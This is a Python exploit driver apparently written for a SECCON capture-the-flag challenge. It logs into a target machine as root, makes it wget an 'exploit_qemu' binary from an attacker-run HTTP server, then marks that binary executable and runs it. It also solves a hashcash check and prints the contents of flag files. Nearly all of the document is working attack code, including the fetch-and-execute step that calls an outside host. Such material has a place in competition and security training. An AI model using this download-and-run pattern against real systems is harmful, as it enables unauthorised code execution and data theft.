#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
import socketserver

# context.log_level = 'debug'

#==========

env = Environment('local', 'remote', 'monitor')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  local   = {'argv':['../run.sh']}, \
                        remote  = {'host':'localhost', 'port':3824}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':os.getenv('SECCON_PORT')})
env.set_item('expsvr',  local   = 'http://192.168.44.128:8080', \
                        remote  = 'http://192.168.44.128:8080', \
                        monitor = os.getenv('CONNECTBACK_URL'))
env.select(args.ENV or 'monitor')

#==========

def attack(conn, **kwargs):
    conn.sendlineafter(b'login: ', b'root')
    conn.sendlineafter(b'# ', b'cd /tmp')
    conn.sendlineafter(b'# ', f'wget {env.expsvr}/exploit_qemu -O x'.encode())
    if b'saved' not in conn.recvuntil(b'saved', timeout=2):
        return False

    conn.sendlineafter(b'# ', b'chmod +x x')
    conn.sendlineafter(b'# ', b'./x')

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline(b'exec 2>&1')
    sleep(0.1)
    conn.sendline(b'echo FLAG_HERE; cat flag*')
    conn.recvuntil(b'FLAG_HERE\n')
    print('FLAG : {}'.format(conn.recvline(keepends=False).decode()))

def hashcash(conn, **kwargs):
    conn.recvuntil(b'hashcash ')
    opt = conn.recvline(keepends=False)

    p = process('hashcash {}'.format(opt.decode()).split())
    p.wait_for_close()
    token = p.recv().split()[-1]
    info('token : {}'.format(token))
    conn.sendline(token)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()

    if env.check('monitor'):
        comn.run(hashcash)

    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    socketserver.TCPServer.allow_reuse_address = True
    httpd = ThreadingHTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    main()

#==========
